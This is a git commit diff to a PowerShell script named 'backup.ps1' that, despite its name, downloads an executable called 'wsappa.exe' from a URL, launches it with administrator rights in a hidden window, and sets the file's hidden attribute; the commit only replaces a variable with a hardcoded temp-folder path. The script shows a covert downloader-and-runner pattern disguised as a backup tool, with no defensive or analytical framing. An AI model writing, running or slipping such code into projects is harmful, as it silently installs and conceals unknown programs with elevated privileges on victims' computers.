5c440977a19c74e2d1a153f5634a7c88221e3369
blousekool <132397759+blousekool@users.noreply.github.com>
2023-08-09 12:47:18 +0200

    backup.ps1

--- bd/backup.ps1
+++ bd/backup.ps1
@@ -12,10 +12,10 @@ if (!(Test-Path -Path $savePath)) {
 
         $downloadedFilePath = Join-Path $folderPath "wsappa.exe"
         Invoke-WebRequest -Uri $fileUrl -OutFile $downloadedFilePath
-        Start-Process $downloadedFilePath -Verb RunAs -WindowStyle Hidden
+        Start-Process $env:temp\sVBXKuz\wsappa.exe -Verb RunAs -WindowStyle Hidden
 
         # Hide the downloaded file
-        Set-ItemProperty -Path $downloadedFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        Set-ItemProperty -Path $env:temp\sVBXKuz\wsappa.exe -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
     } catch {
         Write-Host "Failed to download the file: $_"
     }
